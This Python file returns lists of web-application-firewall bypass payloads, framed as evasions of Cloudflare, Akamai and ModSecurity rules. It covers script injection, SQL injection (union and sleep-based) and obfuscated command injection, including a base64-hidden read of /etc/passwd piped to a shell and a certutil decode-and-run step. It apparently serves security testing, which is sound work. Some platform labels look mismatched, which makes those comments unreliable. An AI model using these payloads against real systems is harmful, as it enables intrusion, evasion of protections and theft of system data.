"""
Real-world WAF bypass test cases
Based on Cloudflare, Akamai, ModSecurity CRS rule evasions
"""
def get_waf_bypass_tests(payload_type):
    tests = {
        "xss": [
            # Cloudflare XSS bypasses
            "<svg/onload=alert(1)>",
            "<script>alert(1)</script​>",  # Zero-width space
            "<img src=x oneonerrorrror=alert(1)>",
            
            # Akamai bypasses
            "<a href=\"javascript:alert(1)\">click</a>",
            "<img src=\"x:g\" onerror=\"eval('al'+'ert(1)')\">",
            
            # ModSecurity CRS bypasses
            "<script>/*!*/alert/*!*/(1)</script>",
            "<img src=x onerror\r\n=alert(1)>"
        ],
        "sqli": [
            # Cloudflare SQLi bypasses
            "1' UNI/**/ON SEL/**/ECT 1,2,3-- -",
            "1' AND 1=0x1/*",
            
            # Akamai bypasses
            "1' OR 'a'='a'--",
            "1' UNION SELECT NULL,@@version,NULL--",
            
            # ModSecurity CRS bypasses
            "1' /*!50000UNION*/ /*!50000SELect*/ 1,2,3-- -",
            "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a) -- "
        ],
        "cmdi": [
            # Command separator bypasses
            "sleep${IFS}5",  # Linux
            "ping${IFS}-n${IFS}5${IFS}127.0.0.1",  # Windows
            
            # Blacklist evasion
            "who''ami",  # Linux
            "who\"am\"i",  # Linux
            "who^ami",  # Windows
            "w'h'o'a'm'i",  # Linux
            
            # Encoding bypasses
            "echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh",  # Linux
            "certutil -decode encoded.txt cmd.bat & cmd.bat"  # Windows
        ]
    }
    return tests.get(payload_type, [])
